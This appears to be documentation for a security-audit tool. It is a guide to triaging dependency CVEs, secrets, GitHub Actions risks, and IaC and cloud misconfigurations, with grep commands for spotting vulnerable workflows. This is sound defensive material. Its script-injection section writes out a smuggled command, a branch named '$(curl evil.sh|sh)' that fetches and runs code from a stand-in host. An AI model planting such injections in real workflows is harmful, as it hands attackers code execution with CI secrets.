# Supply chain, CI/CD and cloud

The scanners produce this half of the report — usually the *majority* of it by count. That makes
triage, not detection, the skill: a 200-CVE list nobody acts on is worth less than the five you
proved matter. This file is the decision method for dependency findings and secrets, plus the
CI/IaC classes no scanner in the belt covers well.

---

## Dependency CVEs: what to do with 200 of them

`scan` already correlates across tools (one advisory seen by trivy, osv-scanner and grype is one
finding whose `sources[]` names all three) and ranks by a composite `risk` = severity ⊕ EPSS ⊕
CISA KEV. **Work the list in `risk` order and stop when the rest are below your bar** — that is
what the ranking is for.

### The prioritization ladder

The composite score encodes a CISA-SSVC-style ordering: **exploitation status first,
exploitability second, impact third.** Concretely (the labelled reference ranking in
`tests/fixtures/calibration/reference-triage.json` pins this, and
`tests/scoring-calibration.test.ts` holds the engine to it):

1. **KEV** — in CISA's Known Exploited Vulnerabilities catalog. Known-exploited beats everything;
   a MEDIUM CVSS 6.5 in KEV outranks a CRITICAL 9.1 that isn't. Treat as an operational deadline,
   not a backlog item.
2. **EPSS** — probability of exploitation in the next 30 days. High EPSS on a MEDIUM outranks a
   low-EPSS CRITICAL: CVSS 9.3 with EPSS 0.03 ranks *below* CVSS 6.1 with EPSS 0.97.
3. **CVSS / severity** — the tie-break, not the sort key. It measures worst-case impact in a
   generic deployment, which is rarely yours.

Under `--offline`/`--no-enrich` you get severity-only ranking; say so in the report, because the
top of that list is a different list.

### Then apply the five questions the score can't answer

- **Is the vulnerable code path actually reachable?** The strongest reduction available. Grep for
  the symbol the advisory names, not the package: a `lodash` prototype-pollution CVE in `merge`
  is irrelevant if you only import `get`. For Go, `govulncheck` answers this mechanically —
  weight its findings above a plain lockfile match.
- **Direct or transitive?** A transitive dependency you can't upgrade without the parent is a
  different work item (pin/override/fork) from a direct bump. Both are real; the fix differs.
- **Dev-only?** `devDependencies`, `[dev-dependencies]`, `test`/`provided` scope. Not shipped ⇒
  not exploitable in production, but **still exploitable against your CI** if it runs on
  untrusted input (see below). Downgrade the severity, don't dismiss the finding.
- **Does the CVSS vector match your deployment?** `AV:N` on a service that only listens on
  localhost; `PR:H` on something no attacker reaches; `UI:R` on a headless daemon. Rate what your
  deployment exposes.
- **Is there a fixed version?** If not, the finding is real and the remediation is compensating
  controls — say that instead of filing an impossible upgrade.

A dependency finding you keep should carry, in one line: the package and version, the reachable
symbol (or "reachability unconfirmed"), the fixed version (or "no fix"), and the KEV/EPSS reason
it ranks where it does.

### Version-merged advisories

The correlator collapses one advisory reported at several versions or lockfiles into a single
finding whose `locations[]` keeps each `{file, line, version}`. Fix the whole cluster, and check
that every location moves — a monorepo that bumps one workspace and not the other looks fixed and
isn't.

## Secrets

The most time-sensitive class in the report. A secret finding is not a backlog item; it is an
incident with a clock.

**Order of operations, always:** (1) determine whether it is live, (2) **rotate at the source**,
(3) only then clean the repository. Rotating last is the common mistake — history rewriting is
slow and public, and it tells an attacker exactly what to go looking for.

- `verified: true` on a finding means a scanner actively confirmed the credential works
  (kingfisher, TruffleHog verification). That is an active compromise, not a hygiene issue.
- **Git history matters more than the working tree.** A secret removed in a later commit is still
  in every clone. `gitleaks` scans history; a grep of HEAD does not.
- **Triage the shape before the value.** A high-entropy string in a test fixture, an
  `.env.example`, a docs snippet or a public key is not a secret. Trivy and gitleaks both hit
  these; that's the expected false-positive profile, not a scanner defect.
- **Rate by what the credential opens**, not by its type: a read-only analytics key is LOW; a
  cloud access key or a signing key (`SECRET_KEY`, `APP_KEY`, `secret_key_base`) is CRITICAL
  because it converts into session forgery or full account access.
- After rotation, ask *why* it was committed — a missing `.gitignore` entry, a pre-commit hook
  that isn't installed, or a config pattern that makes committing the easy path. That's the root
  cause and it belongs in `NARRATIVE.json`.

## CI/CD — the class with the worst severity-to-attention ratio

Almost nothing in the tool belt looks here, and the findings are frequently CRITICAL: CI holds
the credentials to production and runs code on every push.

**GitHub Actions, in descending severity:**

- **`pull_request_target` + checking out the PR head.** `pull_request_target` runs with the base
  repo's secrets **and** write token. Combined with
  `actions/checkout` of `github.event.pull_request.head.sha` (or `head.ref`) and *any* step that
  executes repo content — a build, a test, an `npm install` with lifecycle scripts, a linter with
  a repo-local config — an untrusted fork PR achieves arbitrary code execution with your secrets.
  This is the single highest-value grep in the class:
  ```
  rg -n "pull_request_target" -A 30 .github/workflows/ | rg -n "checkout|head\.(sha|ref)"
  ```
- **Script injection via `${{ }}`.** Anything from `github.event` interpolated into a `run:`
  block is attacker-controlled text pasted into a shell: `github.event.issue.title`,
  `pull_request.title`/`body`, `comment.body`, `head_ref`, `commit.message`, `review.body`. A
  branch named `$(curl evil.sh|sh)` executes. The fix is passing through `env:` and quoting
  `"$VAR"`, not escaping.
  ```
  rg -n 'run:' -A 5 .github/workflows/ | rg -n '\$\{\{ *github\.(event|head_ref)'
  ```
- **Unpinned third-party actions.** `uses: some/action@v3` follows a mutable tag; the owner (or
  anyone who compromises them) can change what it runs. Pin to a full commit SHA. Rate by what
  the workflow's token can do.
- **Over-broad `permissions`.** Absent or `write-all` gives the default `GITHUB_TOKEN` write
  access to contents, packages and deployments. `permissions: read-all` plus per-job grants is
  the baseline.
- **Self-hosted runners on a public repo.** Fork PRs execute on your infrastructure, and
  non-ephemeral runners leak state between jobs.
- **Secrets reachable from a fork-triggered workflow** at all — check the trigger, not just the
  step.
- **Artifact and cache poisoning** — a cache key an untrusted job can write, restored into a
  trusted one.

**Package-manager lifecycle:** `postinstall`/`preinstall`/`prepare` scripts run arbitrary code on
`npm install`, in CI and on every developer machine. Audit them in direct dependencies, and
prefer `--ignore-scripts` in CI where the build allows it. Python `setup.py` and Ruby
`extconf.rb` are the same shape.

**Dependency confusion and typosquatting** — an internal package name that also resolves on the
public registry, a missing scope, a registry configuration that falls back to public. Check for
lockfile integrity (`integrity`/hashes present and verified) and whether the private registry is
the *only* source for internal scopes.

## IaC and cloud

Checkov, trivy misconfig and hadolint cover the catalog; your job is to rate them against the
deployment, because these findings are the most context-dependent in the report.

- **Network** — `0.0.0.0/0` on anything that isn't a load balancer's 443. Rate by what's behind
  it: `0.0.0.0/0` on 22 or 3306 is HIGH; on a public web tier's 443 it is nothing.
- **IAM** — `"Action": "*"` / `"Resource": "*"`, `iam:PassRole` without a condition, a trust
  policy with a wildcard principal, long-lived access keys where a role would do.
- **Storage** — public buckets and snapshots, missing encryption on data at rest, public AMIs.
- **Instance metadata** — IMDSv1 still enabled is what turns a MEDIUM SSRF into credential theft
  (see [attack-classes.md](attack-classes.md)); enforcing IMDSv2 is the compensating control.
- **Kubernetes** — `privileged: true`, `hostNetwork`/`hostPID`, `hostPath` mounts,
  `allowPrivilegeEscalation`, running as root, `automountServiceAccountToken` on pods that don't
  need the API, and RBAC `ClusterRole` with `*` verbs.
- **Terraform state** — state files contain plaintext secrets; check the backend is remote,
  encrypted and access-controlled, and that state isn't committed.
- **Dockerfiles** — secrets in `ENV`/build args baked into layers, `latest` base images, `USER`
  never dropped from root, `ADD` of a remote URL.

**Rate these against the deployment model, always.** "Rate-limiting belongs at the CDN" and
"this bucket is a public asset host" are valid architectures. A misconfiguration finding with no
statement about what it exposes is a checklist item, not a finding.

## SBOM

With `syft` installed, `scan` emits `sbom.cdx.json` (CycloneDX) as a dossier deliverable and
feeds it to grype (`sbom:` mode) and package-checker (`--source`) instead of re-walking the tree.
Beyond speed, it is the artifact that answers "were we affected?" the next time a Log4Shell-class
advisory lands — attach it to the report.

## Per-tool false-positive profiles

Every scanner has a signature noise pattern. Knowing it is most of triage. Frozen real outputs
for all of these live in `tests/fixtures/tool-output/` if you want to see the shapes.

| tool | expected noise | what still deserves a read |
|---|---|---|
| **Bandit** | `B101` (assert used), `B404`/`B603` (imports subprocess), `B311` (random) outside a security context; `B608` fires on *any* SQL f-string including safe ones | `B602` `shell=True`, `B301` pickle, `B506` `yaml.load` |
| **gosec** | `G104` unhandled error, `G304` file path from a variable, `G107` URL from a variable — all flood | `G204` subprocess with tainted args, `G402` TLS verification off, `G404` `math/rand` for tokens |
| **Semgrep** (community rules) | `generic.secrets` on high-entropy non-secrets; framework rules that don't know your version | anything with a taint-mode rule and a concrete sink |
| **Trivy secrets** | `.env.example`, fixtures, docs, public keys | anything in git history, anything `verified` |
| **gitleaks** | same, plus base64 blobs and UUIDs | history hits — the working tree is the least interesting place |
| **hadolint** | `DL3008`/`DL3018` (pin apt/apk versions) are style at most | `DL3002` running as root, secrets in `ENV` |
| **checkov** | Terraform modules whose values come from variables it can't resolve | anything with a literal `0.0.0.0/0`, `*`, or `public` |
| **osv/grype/trivy deps** | high volume, near-zero false positives on *presence* — the noise is **relevance**, not correctness | KEV and high-EPSS entries, and anything you can show is reachable |

A scanner finding lands `open` like any other candidate and goes through the same
`[file:line]` gate. Corroboration (`sources[]` longer than one) is a confidence prior for verify,
never a verdict.

## What the tool belt does *not* cover

Say this in the report, because a reader will assume otherwise: there is **no DAST, no fuzzing,
no authenticated crawling, no runtime testing**, and no coverage of authorization or business
logic. Everything in [attack-classes.md](attack-classes.md) is manual by construction. A clean
scanner run means the known-pattern layer is clean — nothing more.

---

Related: [tools.md](tools.md) (what each scanner is and how it runs) ·
[severity-and-discipline.md](severity-and-discipline.md) (rating) ·
[adjudication.md](adjudication.md) (the verdict).
